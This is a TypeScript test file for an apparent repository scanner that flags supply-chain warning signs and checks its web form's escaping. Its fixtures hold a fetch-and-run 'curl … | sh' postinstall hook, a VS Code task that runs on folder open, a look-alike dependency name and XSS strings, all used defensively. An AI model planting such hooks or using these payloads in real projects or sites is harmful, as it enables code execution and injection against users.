import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import type { StatsSource } from '@dependency-radar/core';
import { demoDeps } from '../src/demo.ts';
import { createHandler } from '../src/handler.ts';
import type { HttpRequest } from '../src/handler.ts';
import { createRateLimiter } from '../src/limits.ts';
import { createAnalyzeService } from '../src/service.ts';
import { makeZip } from './zip-helper.ts';
import type { ZipEntry } from './zip-helper.ts';

const suspicious: ZipEntry[] = [
  { name: 'task-main/package.json', data: JSON.stringify({ name: 'task', scripts: { postinstall: 'curl -s https://example.test/a.sh | sh' }, dependencies: { crossenv: '1.0.0' } }, null, 2) },
  { name: 'task-main/.vscode/tasks.json', data: '{ "tasks": [{ "command": "node .vscode/x.js", "runOptions": { "runOn": "folderOpen" } }] }' },
  { name: 'task-main/tools/run.exe', data: 'MZ' },
  { name: 'task-main/node_modules/dep/index.js', data: 'x' },
  { name: 'task-main/README.md', data: '# read me' },
];

const cleanRepo: ZipEntry[] = [
  { name: 'ok-main/package.json', data: JSON.stringify({ scripts: { build: 'vite build' }, dependencies: { react: '^18.0.0' } }) },
  { name: 'ok-main/src/index.ts', data: 'export const a = 1;' },
];

function zipFetch(entries: readonly ZipEntry[], status = 200) {
  const zip = makeZip(entries);
  const urls: string[] = [];
  const fakeFetch = (async (input: string | URL | Request) => {
    urls.push(String(input));
    return status === 200 ? new Response(zip) : new Response('', { status });
  }) as typeof fetch;
  return { fetch: fakeFetch, urls };
}

const noRegistry = {
  registry: { async getPackument(): Promise<never> { throw new Error('the registry must not be used'); } },
  manifests: demoDeps.manifests,
  changelogs: demoDeps.changelogs,
  now: () => new Date('2026-11-06T10:00:00Z'),
};

describe('check', () => {
  it('reads a repository without running or analyzing anything and finds the warning signs', async () => {
    const { fetch, urls } = zipFetch(suspicious);
    const outcome = await createAnalyzeService({ ...noRegistry, fetch }).check({ githubUrl: 'https://github.com/octo/task' });
    assert.ok(outcome.ok);
    assert.deepEqual(urls, ['https://codeload.github.com/octo/task/zip/HEAD']);
    assert.equal(outcome.check.subject, 'https://github.com/octo/task');
    assert.equal(outcome.check.generatedAt, '2026-11-06T10:00:00.000Z');
    const ids = outcome.check.report.signals.map((signal) => signal.id);
    for (const id of ['script-download-exec', 'vscode-auto-task', 'dependency-lookalike', 'binary-file', 'committed-node-modules']) {
      assert.ok(ids.includes(id), id);
    }
    assert.equal(outcome.check.report.highest, 'high');
    assert.equal(outcome.check.report.signals.find((signal) => signal.id === 'vscode-auto-task')?.file, '.vscode/tasks.json');
  });

  it('finds nothing alarming in an ordinary repository, and still never calls it safe', async () => {
    const outcome = await createAnalyzeService({ ...noRegistry, fetch: zipFetch(cleanRepo).fetch }).check({ githubUrl: 'octo/ok' });
    assert.ok(outcome.ok);
    assert.equal(outcome.check.report.highest, 'none');
    assert.ok(outcome.check.report.limitations.some((text) => /does not mean a repository is safe/.test(text)));
  });

  it('only looks inside a folder when the address names one', async () => {
    const entries: ZipEntry[] = [
      { name: 'mono-main/package.json', data: '{ "scripts": { "build": "vite build" } }' },
      { name: 'mono-main/packages/web/package.json', data: '{ "scripts": { "postinstall": "curl x | sh" } }' },
    ];
    const service = createAnalyzeService({ ...noRegistry, fetch: zipFetch(entries).fetch });
    const inside = await service.check({ githubUrl: 'https://github.com/octo/mono/tree/main/packages/web' });
    assert.ok(inside.ok);
    assert.equal(inside.check.subject, 'https://github.com/octo/mono (branch main, packages/web)');
    assert.equal(inside.check.report.highest, 'high');
    assert.equal(inside.check.report.signals[0]?.file, 'package.json');
    const whole = await service.check({ githubUrl: 'https://github.com/octo/mono' });
    assert.ok(whole.ok);
    assert.equal(whole.check.report.signals[0]?.file, 'packages/web/package.json');
  });

  it('uses download counts to rank look-alike names when they are available', async () => {
    const stats: StatsSource = { async weeklyDownloads() { return 7; } };
    const outcome = await createAnalyzeService({ ...noRegistry, fetch: zipFetch(suspicious).fetch, stats }).check({ githubUrl: 'octo/task' });
    assert.ok(outcome.ok);
    const lookalike = outcome.check.report.signals.find((signal) => signal.id === 'dependency-lookalike');
    assert.equal(lookalike?.severity, 'high');
    assert.match(lookalike?.detail ?? '', /only 7 downloads/);
  });

  it('keeps going and says so when download counts cannot be looked up', async () => {
    const stats: StatsSource = { async weeklyDownloads() { throw new Error('down'); } };
    const outcome = await createAnalyzeService({ ...noRegistry, fetch: zipFetch(suspicious).fetch, stats }).check({ githubUrl: 'octo/task' });
    assert.ok(outcome.ok);
    assert.equal(outcome.check.report.signals.find((signal) => signal.id === 'dependency-lookalike')?.severity, 'medium');
  });

  it('rejects missing and invalid input and repositories it cannot read', async () => {
    const service = createAnalyzeService({ ...noRegistry, fetch: zipFetch([], 404).fetch });
    const missing = await service.check({});
    assert.ok(!missing.ok);
    assert.equal(missing.status, 400);
    const invalid = await service.check({ githubUrl: 'https://gitlab.com/a/b' });
    assert.ok(!invalid.ok);
    assert.equal(invalid.code, 'INVALID_GITHUB_URL');
    const unavailable = await service.check({ githubUrl: 'octo/private' });
    assert.ok(!unavailable.ok);
    assert.equal(unavailable.status, 404);
    assert.match(unavailable.message, /private/);
  });
});

function setup(entries: readonly ZipEntry[], limit = 100) {
  const service = createAnalyzeService({ ...noRegistry, fetch: zipFetch(entries).fetch });
  const handler = createHandler({
    service,
    limiter: createRateLimiter({ limit, windowMs: 3_600_000 }),
    demo: async () => {
      throw new Error('not used');
    },
    serverAiEnabled: false,
  });
  return (method: string, path: string, extra: Partial<HttpRequest> = {}) => handler({ method, path, headers: {}, body: '', ip: '203.0.113.1', ...extra });
}

const form = (fields: Record<string, string>) => ({
  headers: { 'content-type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams(fields).toString(),
});
const jsonBody = (value: unknown) => ({ headers: { 'content-type': 'application/json' }, body: JSON.stringify(value) });

describe('check routes', () => {
  it('serves the form and links to it from the home page', async () => {
    const call = setup(suspicious);
    const page = await call('GET', '/check');
    assert.equal(page.status, 200);
    assert.match(page.body, /<form method="post" action="\/check">/);
    assert.match(page.body, /Finding no signals does not mean a repository is safe/);
    assert.match((await call('GET', '/')).body, /href="\/check"/);
  });

  it('shows an HTML report', async () => {
    const response = await setup(suspicious)('POST', '/check', form({ githubUrl: 'https://github.com/octo/task' }));
    assert.equal(response.status, 200);
    assert.match(response.body, /High-risk signals found/);
    assert.match(response.body, /Downloads and runs code in &quot;postinstall&quot;/);
    assert.match(response.body, /Check another repository/);
    assert.match(response.headers['content-security-policy'] ?? '', /default-src 'none'/);
  });

  it('returns JSON for the API', async () => {
    const response = await setup(suspicious)('POST', '/api/check', jsonBody({ githubUrl: 'octo/task' }));
    assert.equal(response.status, 200);
    const data = JSON.parse(response.body);
    assert.equal(data.highest, 'high');
    assert.equal(data.verdict.title, 'High-risk signals found');
    assert.ok(data.signals.length >= 4);
    assert.ok(data.limitations.length >= 3);
    assert.equal(data.subject, 'https://github.com/octo/task');
  });

  it('reports a quiet repository without calling it safe', async () => {
    const response = await setup(cleanRepo)('POST', '/check', form({ githubUrl: 'octo/ok' }));
    assert.match(response.body, /No serious signals found/);
    assert.match(response.body, /does not mean the project is safe/);
    assert.equal(/\bsafe to (?:install|run|use)\b/i.test(response.body), false);
  });

  it('shows errors on the form and keeps the address, escaped', async () => {
    const call = setup(suspicious);
    const bad = await call('POST', '/check', form({ githubUrl: '"><script>alert(1)</script>' }));
    assert.equal(bad.status, 400);
    assert.equal(/<script/i.test(bad.body), false);
    assert.match(bad.body, /role="alert">Enter a GitHub repository address like/);
    const missing = await call('POST', '/api/check', jsonBody({}));
    assert.equal(missing.status, 400);
    assert.equal(JSON.parse(missing.body).error.code, 'MISSING_INPUT');
  });

  it('escapes whatever the repository contains', async () => {
    const hostile = '<script>alert(1)</script><img src=x onerror=alert(2)>';
    const entries: ZipEntry[] = [{ name: 'x-main/package.json', data: JSON.stringify({ scripts: { postinstall: `curl -s https://example.test | sh # ${hostile}` }, dependencies: { crossenv: '1.0.0' } }) }];
    const response = await setup(entries)('POST', '/check', form({ githubUrl: 'octo/x' }));
    assert.equal(response.status, 200);
    assert.equal(/<script/i.test(response.body), false);
    assert.equal(/<img/i.test(response.body), false);
    assert.ok(response.body.includes('&lt;script&gt;'));
  });

  it('applies the same limits and protocol rules as the other analyses', async () => {
    const call = setup(suspicious, 1);
    assert.equal((await call('POST', '/api/check', jsonBody({ githubUrl: 'octo/task' }))).status, 200);
    assert.equal((await call('POST', '/api/check', jsonBody({ githubUrl: 'octo/task' }))).status, 429);
    const fresh = setup(suspicious);
    assert.equal((await fresh('GET', '/api/check')).status, 405);
    assert.equal((await fresh('POST', '/api/check', { body: '{}' })).status, 415);
    assert.equal((await fresh('POST', '/check', jsonBody({}))).status, 415);
    assert.equal((await fresh('DELETE', '/check')).headers.allow, 'GET, POST');
  });
});
